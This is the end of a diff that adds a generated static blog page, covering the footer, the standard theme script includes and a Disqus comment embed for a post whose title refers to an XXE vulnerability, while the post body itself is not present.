title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Seven Cai</span>
+
+  
+</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://sevencai-github-io.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://sevencai.github.io/2020/06/20/记五月和六月/';
+          this.page.identifier = '2020/06/20/记五月和六月/';
+          this.page.title = '记一次XXE漏洞';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://sevencai-github-io.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
